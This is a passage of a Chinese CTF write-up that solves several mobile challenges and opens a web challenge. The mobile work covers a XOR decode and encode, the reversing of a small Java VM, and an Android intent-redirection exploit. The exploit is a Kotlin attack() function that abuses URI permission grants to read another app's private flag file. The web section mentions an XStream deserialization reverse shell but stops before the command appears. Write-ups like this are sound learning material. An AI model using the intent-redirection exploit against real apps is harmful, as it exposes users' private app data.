<p class="my-4 leading-7">至此虽然全部的方法都了解了，但是给远程服务发什么都还没有思路。</p>
<p class="my-4 leading-7">========================卡了很久的分割线====================</p>
<p class="my-4 leading-7">给了hint说注意Referer，我又重点看了一下。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>Referer:https://www.baidu.com/?wd=020D0F010208090A\n</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">里面wd后面的字符串很像flag函数加密的结果，写个程序解密一下。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun decode(str: String): String {
</span></span><span style="display:block;padding:0 1.25rem">    val sb = StringBuilder()
</span><span style="display:block;padding:0 1.25rem">    for (i in 0 until str.length / 2) {
</span><span style="display:block;padding:0 1.25rem">        val x = str2.indexOf(str[i * 2]) * 16 + str2.indexOf(str[i * 2 + 1])
</span><span style="display:block;padding:0 1.25rem">        sb.append(Char(x xor str1[i].code))
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return sb.toString()
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">// println(decode(&quot;020D0F010208090A&quot;))
</span><span style="display:block;padding:0 1.25rem">// fakeflag</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">结果是fakeflag，意思是发送trueflag过去吗？</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun encode(): String {
</span></span><span style="display:block;padding:0 1.25rem">    val input = &quot;trueflag&quot;
</span><span style="display:block;padding:0 1.25rem">    val inputLen = input.length
</span><span style="display:block;padding:0 1.25rem">    val output = CharArray(inputLen + 1)
</span><span style="display:block;padding:0 1.25rem">    if (inputLen &gt; 0) {
</span><span style="display:block;padding:0 1.25rem">        var x = 0
</span><span style="display:block;padding:0 1.25rem">        var y = 0
</span><span style="display:block;padding:0 1.25rem">        while (x != inputLen) {
</span><span style="display:block;padding:0 1.25rem">            val ch = str1[y]
</span><span style="display:block;padding:0 1.25rem">            y = y - ((y + (((y + 1) shr 31) shr 29) + 1) and 0xFFFFFF8) + 1
</span><span style="display:block;padding:0 1.25rem">            output[x] = (input[x].code xor ch.code).toChar()
</span><span style="display:block;padding:0 1.25rem">            x++
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    output[inputLen] = 0.toChar()
</span><span style="display:block;padding:0 1.25rem">    val output2 = CharArray(2 * inputLen + 1)
</span><span style="display:block;padding:0 1.25rem">    if (inputLen &gt; 0) {
</span><span style="display:block;padding:0 1.25rem">        for (i in 0 until inputLen) {
</span><span style="display:block;padding:0 1.25rem">            val tmp = output[i].code % 16
</span><span style="display:block;padding:0 1.25rem">            output2[2 * i] = str2[output[i].code / 16]
</span><span style="display:block;padding:0 1.25rem">            output2[2 * i + 1] = str2[tmp]
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    output2[2 * inputLen] = 0.toChar()
</span><span style="display:block;padding:0 1.25rem">    println(output2.joinToString(&quot;&quot;))
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">// 101E11010208090A</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">构造请求，发送，成功返回flag</p>
<p class="my-4 leading-7"><img alt="构造请求" src="/static/image/mobile-9-2.dee4c033.png"/></p>
<h3 id="mobile-10-vm" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-10-vm">#</a>mobile-10 VM</h3>
<p class="my-4 leading-7">反编译看一下，用java写了一个简单的虚拟机来执行代码，指令集也比较少。将代码提取出来转成了kotlin语言。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_10
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">// @formatter:off
</span><span style="display:block;padding:0 1.25rem">val opcode = intArrayOf(
</span><span style="display:block;padding:0 1.25rem"> 3, 0, 0, 0, 0, 0,
</span><span style="display:block;padding:0 1.25rem"> 3, 0, 0, 0, 0, 1,
</span><span style="display:block;padding:0 1.25rem"> 3, 0, 0, 0, 0, 2,
</span><span style="display:block;padding:0 1.25rem"> 3, 23, 0, 0, 0, 3,
</span><span style="display:block;padding:0 1.25rem"> 3, 3, 0, 0, 0, 4,
</span><span style="display:block;padding:0 1.25rem"> 3, 87, 4, 0, 0, 5,
</span><span style="display:block;padding:0 1.25rem"> 3, 127, 0, 0, 0, 6,
</span><span style="display:block;padding:0 1.25rem"> 3, /* a2 */ 25, 0, 0, 0, 7,
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem"> 2, 2, 0,
</span><span style="display:block;padding:0 1.25rem"> 9, 2,
</span><span style="display:block;padding:0 1.25rem"> 1, 3, 1,
</span><span style="display:block;padding:0 1.25rem"> 6, 4, 1,
</span><span style="display:block;padding:0 1.25rem"> 4, 5, 1,
</span><span style="display:block;padding:0 1.25rem"> 8, 6, 1,
</span><span style="display:block;padding:0 1.25rem"> 1, 1, 3,
</span><span style="display:block;padding:0 1.25rem"> 10, 0, 1,
</span><span style="display:block;padding:0 1.25rem"> 11, 10, // jump -&gt; a1
</span><span style="display:block;padding:0 1.25rem"> 10, 2, 7,
</span><span style="display:block;padding:0 1.25rem"> 11, 222, // jump -&gt; a2
</span><span style="display:block;padding:0 1.25rem"> 12,
</span><span style="display:block;padding:0 1.25rem"> 0,
</span><span style="display:block;padding:0 1.25rem"> 0,
</span><span style="display:block;padding:0 1.25rem"> 0, // a1
</span><span style="display:block;padding:0 1.25rem">)
</span><span style="display:block;padding:0 1.25rem">// @formatter:on
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">var tag = false
</span><span style="display:block;padding:0 1.25rem">val dest =
</span><span style="display:block;padding:0 1.25rem">    intArrayOf(37, 79, 78, 75, 66, 39, 85, 96, 2, 101, 17, 19, 25, 43, 97, 5, 110, 44, 100, 14, 10, 125, 89, 108, 38)
</span><span style="display:block;padding:0 1.25rem">val checkDest = ArrayList&lt;Int&gt;()
</span><span style="display:block;padding:0 1.25rem">fun vm() {
</span><span style="display:block;padding:0 1.25rem">    val register = IntArray(8)
</span><span style="display:block;padding:0 1.25rem">    var pos = 0
</span><span style="display:block;padding:0 1.25rem">    var isRunning = true
</span><span style="display:block;padding:0 1.25rem">    var tmp1 = 0
</span><span style="display:block;padding:0 1.25rem">    while (isRunning) {
</span><span style="display:block;padding:0 1.25rem">        var tmp2: Int
</span><span style="display:block;padding:0 1.25rem">        when (opcode[pos]) {
</span><span style="display:block;padding:0 1.25rem">            // 停机指令
</span><span style="display:block;padding:0 1.25rem">            0 -&gt; isRunning = false
</span><span style="display:block;padding:0 1.25rem">            // op a b 将寄存器a的值赋值给寄存器b b = a
</span><span style="display:block;padding:0 1.25rem">            1 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] = register[opcode[pos + 1]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 将寄存器a指向的数据加载到寄存器b b = load(a)
</span><span style="display:block;padding:0 1.25rem">            2 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] = dest[register[opcode[pos + 1]]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op x1 x2 x3 x4 e 将常量 x4x3x2x1 加载到寄存器e e = x
</span><span style="display:block;padding:0 1.25rem">            3 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 5]] =
</span><span style="display:block;padding:0 1.25rem">                    opcode[pos + 1] + (opcode[pos + 2] shl 8) + (opcode[pos + 3] shl 16) + (opcode[pos + 4] shl 24)
</span><span style="display:block;padding:0 1.25rem">                pos += 5
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 寄存器a累加给寄存器b的值相加 b = a + b
</span><span style="display:block;padding:0 1.25rem">            4 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] += register[opcode[pos + 1]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 寄存器a减寄存器b并赋值给寄存器b b = a - b
</span><span style="display:block;padding:0 1.25rem">            5 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] = register[opcode[pos + 1]] - register[opcode[pos + 2]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 寄存器a乘以寄存器b并赋值给寄存器b b = a * b
</span><span style="display:block;padding:0 1.25rem">            6 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] = register[opcode[pos + 1]] * register[opcode[pos + 2]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 寄存器a除以寄存器b并赋值给寄存器b b = a / b
</span><span style="display:block;padding:0 1.25rem">            7 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] = register[opcode[pos + 1]] / register[opcode[pos + 2]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 寄存器b取余寄存器a并赋值给寄存器b b = b % a
</span><span style="display:block;padding:0 1.25rem">            8 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                register[opcode[pos + 2]] %= register[opcode[pos + 1]]
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a 寄存器a自加1
</span><span style="display:block;padding:0 1.25rem">            9 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                tmp2 = opcode[pos + 1]
</span><span style="display:block;padding:0 1.25rem">                register[tmp2]++
</span><span style="display:block;padding:0 1.25rem">                ++pos
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a b 判断寄存器a和寄存器b的值是否相等
</span><span style="display:block;padding:0 1.25rem">            10 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                tmp2 = register[opcode[pos + 1]]
</span><span style="display:block;padding:0 1.25rem">                tmp1 = register[opcode[pos + 2]]
</span><span style="display:block;padding:0 1.25rem">                if (pos == 68) {
</span><span style="display:block;padding:0 1.25rem">                    println(&quot;${tmp2}-${tmp1}&quot;)
</span><span style="display:block;padding:0 1.25rem">//                    tmp2 = tmp1
</span><span style="display:block;padding:0 1.25rem">                    checkDest.add(tmp1)
</span><span style="display:block;padding:0 1.25rem">                }
</span><span style="display:block;padding:0 1.25rem">                pos += 2
</span><span style="display:block;padding:0 1.25rem">                tmp1 = tmp2 - tmp1
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // op a 跳转指令
</span><span style="display:block;padding:0 1.25rem">            11 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                val p = opcode[pos + 1]
</span><span style="display:block;padding:0 1.25rem">                tmp2 = pos
</span><span style="display:block;padding:0 1.25rem">                if (tmp1 != 0) {
</span><span style="display:block;padding:0 1.25rem">                    tmp2 = if (p &lt; 128) {
</span><span style="display:block;padding:0 1.25rem">                        p
</span><span style="display:block;padding:0 1.25rem">                    } else {
</span><span style="display:block;padding:0 1.25rem">                        p - 256
</span><span style="display:block;padding:0 1.25rem">                    }
</span><span style="display:block;padding:0 1.25rem">                    tmp2 = pos + (tmp2 - 2)
</span><span style="display:block;padding:0 1.25rem">                }
</span><span style="display:block;padding:0 1.25rem">                pos = tmp2 + 1
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">            // 成功
</span><span style="display:block;padding:0 1.25rem">            12 -&gt; {
</span><span style="display:block;padding:0 1.25rem">                tag = true
</span><span style="display:block;padding:0 1.25rem">                println(checkDest.joinToString(&quot;,&quot;))
</span><span style="display:block;padding:0 1.25rem">                ++pos
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">        ++pos
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    vm()
</span><span style="display:block;padding:0 1.25rem">    val origin = intArrayOf(
</span><span style="display:block;padding:0 1.25rem">        67,
</span><span style="display:block;padding:0 1.25rem">        35,
</span><span style="display:block;padding:0 1.25rem">        47,
</span><span style="display:block;padding:0 1.25rem">        44,
</span><span style="display:block;padding:0 1.25rem">        57,
</span><span style="display:block;padding:0 1.25rem">        110,
</span><span style="display:block;padding:0 1.25rem">        33,
</span><span style="display:block;padding:0 1.25rem">        63,
</span><span style="display:block;padding:0 1.25rem">        51,
</span><span style="display:block;padding:0 1.25rem">        22,
</span><span style="display:block;padding:0 1.25rem">        78,
</span><span style="display:block;padding:0 1.25rem">        114,
</span><span style="display:block;padding:0 1.25rem">        87,
</span><span style="display:block;padding:0 1.25rem">        116,
</span><span style="display:block;padding:0 1.25rem">        0,
</span><span style="display:block;padding:0 1.25rem">        104,
</span><span style="display:block;padding:0 1.25rem">        15,
</span><span style="display:block;padding:0 1.25rem">        86,
</span><span style="display:block;padding:0 1.25rem">        85,
</span><span style="display:block;padding:0 1.25rem">        96,
</span><span style="display:block;padding:0 1.25rem">        109,
</span><span style="display:block;padding:0 1.25rem">        34,
</span><span style="display:block;padding:0 1.25rem">        47,
</span><span style="display:block;padding:0 1.25rem">        1,
</span><span style="display:block;padding:0 1.25rem">        91
</span><span style="display:block;padding:0 1.25rem">    )
</span><span style="display:block;padding:0 1.25rem">    val sb = StringBuilder()
</span><span style="display:block;padding:0 1.25rem">    for (i in origin.indices) {
</span><span style="display:block;padding:0 1.25rem">        sb.append(Char(origin[i] xor dest[i]))
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    println(sb.toString())
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">代码做了简单的注释，也对opcode进行了分组。</p>
<p class="my-4 leading-7">大体含义，先对8个寄存器进行初始化，然后寄存器内的数字进行运算，与dest中的每一位进行比较。如果全部比较成功，则正常退出返回。</p>
<p class="my-4 leading-7">由于只是内部的值参数运算，而dest全程未参与，只是用于比较。于是这里做了个trick，在比较的指令码11里记录当前运算的值，并将比较结果强行置为true。这样vm不会因值不相等而退出，而且执行完成的结果就是最终的运算结果了。</p>
<p class="my-4 leading-7">别漏了apk反编译的java代码里的一个逻辑，将运算结果与初始数组进行异或，还原出原始的字符串。</p>
<h3 id="mobile-11-重定向进阶" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-11-重定向进阶">#</a>mobile-11 重定向进阶</h3>
<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
<p class="my-4 leading-7">确定是bytectf的一道原题了，当时还有幸和同学一起做过</p>
</blockquote>
<p class="my-4 leading-7">简单来说，flag是写在自己目录空间里的，其它应用没有直接访问的权限。而通过转发intent，就相当于使用转发中间人访问自己的资源，我们可以利用这次转发为资源授予读取权限。</p>
<p class="my-4 leading-7">难点在于怎么利用获取文件路径，构造provider的资源uri。</p>
<p class="my-4 leading-7">先看文件写入的地址，<code>new File(this.getFilesDir(), &quot;flag&quot;)，getFilesDir()</code>获取的的自己目录空间下的/files目录。应用的目录空间在<code>/data/data/[package_name]/</code>下，所以这个文件写入的地址是<code>/data/data/com.mictf.intent1/files/flag</code>。</p>
<p class="my-4 leading-7">然后构造一个content URI。</p>
<p class="my-4 leading-7">格式为：<code>content://[authorities]/[name]/[file_relative_path]</code></p>
<ul class="list-disc pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">authorities 在AndroidManifest.xml文件有提到，这里是android:authorities=&quot;com.mictf.flag&quot;</li>
<li class="[&amp;:not(:first-child)]:mt-2">name 代表根路径的别称，这个在/res/xml/file_paths.xml文件里，这里是<root-path name="root" path=""></root-path></li>
<li class="[&amp;:not(:first-child)]:mt-2">file_relative_path 就是上面写入的资源路径。</li>
</ul>
<p class="my-4 leading-7">构造出来的contentURI就是</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>content://com.mictf.flag/root/data/data/com.mictf.intent1/files/flag</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">写个intent利用一下：</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun attack() {
</span></span><span style="display:block;padding:0 1.25rem">    val pwn = Intent(&quot;PWN&quot;)
</span><span style="display:block;padding:0 1.25rem">    pwn.setClassName(&quot;com.mictf.intent1&quot;, &quot;com.mictf.intent1.MainActivity&quot;)
</span><span style="display:block;padding:0 1.25rem">    pwn.data =
</span><span style="display:block;padding:0 1.25rem">        Uri.parse(&quot;content://com.mictf.flag/root/data/data/com.mictf.intent1/files/flag&quot;)
</span><span style="display:block;padding:0 1.25rem">    pwn.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or
</span><span style="display:block;padding:0 1.25rem">        Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
</span><span style="display:block;padding:0 1.25rem">   
</span><span style="display:block;padding:0 1.25rem">    startActivityForResult(pwn, 0)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
</span><span style="display:block;padding:0 1.25rem">    super.onActivityResult(requestCode, resultCode, data)
</span><span style="display:block;padding:0 1.25rem">    if (data?.action == &quot;PWN&quot;) {
</span><span style="display:block;padding:0 1.25rem">        val intentData = data.data
</span><span style="display:block;padding:0 1.25rem">        val isr = InputStreamReader(contentResolver.openInputStream(intentData!!))
</span><span style="display:block;padding:0 1.25rem">        val buf = CharArray(1024)
</span><span style="display:block;padding:0 1.25rem">        val sb = StringBuffer(&quot;&quot;)
</span><span style="display:block;padding:0 1.25rem">        while (-1 != isr.read(buf, 0, 1024)) {
</span><span style="display:block;padding:0 1.25rem">            sb.append(String(buf))
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">        val flag = String(sb)
</span><span style="display:block;padding:0 1.25rem">        Toast.makeText(this, flag, Toast.LENGTH_LONG).show()
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">现象是先从attackapp跳转到对应的目标Activity，按back返回后，回到attackapp，同时Toast打印了flag文件里的内容。</p>
<h2 id="web" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web">#</a>Web</h2>
<h3 id="web-1-聊天室" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-1-聊天室">#</a>web-1 聊天室</h3>
<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
<p class="my-4 leading-7">为什么live2d展示不出来。。。</p>
</blockquote>
<p class="my-4 leading-7">直接翻源码，找到flag</p>
<p class="my-4 leading-7"><img alt="flag_in_source" src="/static/image/web-1-1.b89f3721.png"/></p>
<h3 id="web-2-风险组件" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-2-风险组件">#</a>web-2 风险组件</h3>
<p class="my-4 leading-7">放出了hint，提到xStream组件。发现版本是1.4.10，洞洞很多。但是试了好久都没成功。最后终于发现，反弹shell写错了。。。</p>
<p class="my-4 leading-7">基本上都是利用xStream在发序列化xml时候的漏洞。。。</p>
<p class="my-4 leading-7">先在自己服务器上nc监听一个端口</p>
